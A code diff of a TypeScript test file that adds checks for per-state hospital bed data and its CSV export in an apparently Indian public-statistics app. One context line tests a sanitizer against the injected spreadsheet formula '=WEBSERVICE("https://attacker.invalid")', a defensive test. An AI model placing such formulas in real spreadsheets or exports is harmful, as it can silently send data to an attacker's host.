@@ -7,6 +7,7 @@ import { safeSupportingUrl } from "../app/api/corrections/route";
 import { GET as exportStatePacks } from "../app/api/state-packs/export/route";
 import { jurisdictions } from "../lib/evidence";
 import { educationByJurisdiction, vitalByJurisdiction } from "../lib/state-packs";
+import { healthBedsByJurisdiction } from "../lib/health-beds";
 
 test("neutralizes spreadsheet formulas and hostile download names",()=>{
   assert.equal(safeCsvCell("=WEBSERVICE(\"https://attacker.invalid\")"),'"\'=WEBSERVICE(""https://attacker.invalid"")"');
@@ -40,10 +41,13 @@ test("all-state periodic packs cover exactly the jurisdiction model and preserve
   assert.equal(jurisdictions.length,36);
   assert.deepEqual(Object.keys(educationByJurisdiction).sort(),names);
   assert.deepEqual(Object.keys(vitalByJurisdiction).sort(),names);
+  assert.deepEqual(Object.keys(healthBedsByJurisdiction).sort(),names);
   assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.schools,0),1_471_891);
   assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.enrolments,0),248_045_828);
   assert.equal(Object.values(educationByJurisdiction).reduce((sum,item)=>sum+item.teachers,0),9_807_600);
   assert.ok(Object.values(vitalByJurisdiction).every(item=>item.birthRate>0&&item.deathRate>0&&item.infantMortalityRate>=0));
+  assert.equal(Object.values(healthBedsByJurisdiction).reduce((sum,item)=>sum+item.totalBeds,0),818_661);
+  assert.ok(Object.values(healthBedsByJurisdiction).every(item=>item.totalBeds>0&&item.phc>=0&&item.districtHospital>=0));
 });
 
 test("state-pack CSV export is complete, source-labelled and download-safe",async()=>{
@@ -52,5 +56,7 @@ test("state-pack CSV export is complete, source-labelled and download-safe",asyn
   assert.equal(csv.trim().split("\n").length,37);
   assert.match(csv,/"Maharashtra","State","108237","21375970","738114"/);
   assert.match(csv,/"education_source","vital_source"/);
+  assert.match(csv,/"phc_beds","chc_beds","sub_district_hospital_beds"/);
+  assert.match(csv,/"Maharashtra"[^\n]+"45291","31 March 2023"/);
   assert.match(response.headers.get("content-disposition")??"",/^attachment; filename=[a-z0-9.-]+$/);
 });
